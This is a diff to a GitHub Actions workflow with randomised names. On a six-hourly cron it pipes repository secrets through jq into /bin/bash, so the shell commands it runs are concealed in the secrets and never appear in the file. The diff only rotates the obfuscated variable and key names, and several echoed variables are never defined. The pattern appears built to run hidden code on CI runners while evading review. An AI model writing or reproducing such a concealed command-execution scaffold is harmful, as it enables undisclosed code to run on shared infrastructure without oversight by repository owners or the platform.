@@ -1,10 +1,10 @@
 name: sangqiete
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
-jobs:  # 795
+    - cron: '4 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,9 @@ jobs:  # 795
       - uses: actions/checkout@v4
       - name: sangqiete
         env:
-          ode4: ${{ secrets.ode4 }}
+          zrvj9151: ${{ secrets.zrvj9151 }}
         run: |
-          echo $ode4 | jq -r .nr99 | /bin/bash
-          echo $lx17 | jq -r .jfven89055 | /bin/bash
-          echo $mkvw5554 | jq -r .ychg849 | /bin/bash
-          echo $hwgi27166 | jq -r .eg3142 | /bin/bash
-          echo $cbwkn190 | jq -r .bnofv19596 | /bin/bash
-          echo $anwu1480 | jq -r .a06439 | /bin/bash
-          echo $lxmn16 | jq -r .bcx436 | /bin/bash
-          echo $iuvsf785 | jq -r .m9 | /bin/bash
+          echo $zrvj9151 | jq -r .wmxs7 | /bin/bash
+          echo $ztpzr59 | jq -r .fnvd8 | /bin/bash
+          echo $jjwxp80242 | jq -r .l7 | /bin/bash
 
